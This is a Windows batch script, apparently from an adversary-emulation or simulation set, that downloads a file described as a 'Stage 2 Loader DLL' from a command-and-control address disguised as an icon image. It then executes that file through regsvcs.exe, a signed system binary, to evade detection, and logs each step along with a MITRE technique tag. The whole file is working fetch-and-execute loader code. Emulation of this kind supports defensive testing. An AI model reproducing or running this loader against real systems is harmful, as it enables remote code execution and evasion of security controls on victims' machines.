@echo off
setlocal enabledelayedexpansion

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET a1B2c3D4=%APPDATA%\12069\9eaf2d81
SET e5F6g7H8=51d836ea.txt
SET i9J0k1L2=https://10.0.0.49/stage/2/icon.png?12069-7
SET m3N4o5P6=ITZEL-S2B
SET q7R8s9T0=12069
SET u1V2w3X4=7
SET y5Z6a7B8=%PUBLIC%\\macula-simulations.log
SET c9D0e1F2=https://10.0.0.49

REM Cache timestamp for debug lines
for /f "delims=" %%t in ('echo %DATE% %TIME%') do set tsvar=%%t

REM Debug: script start
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: script_start>> "!y5Z6a7B8!" 2>nul

REM 1. Create output directory if missing
mkdir "!a1B2c3D4!" 2>nul

REM Debug: heartbeat start
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: heartbeat_start>> "!y5Z6a7B8!" 2>nul

REM Heartbeat fetch — download Stage 2 Loader DLL from C2
curl -k -s -o "!a1B2c3D4!\!e5F6g7H8!" "!i9J0k1L2!"

REM Debug: heartbeat complete
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: heartbeat_complete>> "!y5Z6a7B8!" 2>nul

REM 2. Position working directory
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: chdir_start>> "!y5Z6a7B8!" 2>nul
cd /d "!a1B2c3D4!" >nul 2>&1
set chdir_ret=!errorlevel!
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: chdir_result=!chdir_ret!>> "!y5Z6a7B8!" 2>nul

REM 3. Invoke the downloaded Stage 2 DLL via regsvcs.exe /U
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: regsvcs_start>> "!y5Z6a7B8!" 2>nul
%SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\regsvcs.exe /U "!a1B2c3D4!\!e5F6g7H8!" >NUL 2>&1
set regsvcs_ret=!errorlevel!
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: regsvcs_result=!regsvcs_ret!>> "!y5Z6a7B8!" 2>nul

REM Generate TTP log line with millisecond timestamp
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set ttp_ts=%%t
if !regsvcs_ret!==0 (
    set ttp_result=OK
    set ttp_error=
) else (
    set ttp_result=FAIL
    set ttp_error=regsvcs_exit_!regsvcs_ret!
)
echo [!ttp_ts!][TTP][!m3N4o5P6!][!q7R8s9T0!]: T1218^|System Binary Proxy Execution=!ttp_result!:!ttp_error!>> "!y5Z6a7B8!" 2>&1

REM Debug: script end
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: script_end>> "!y5Z6a7B8!" 2>nul

endlocal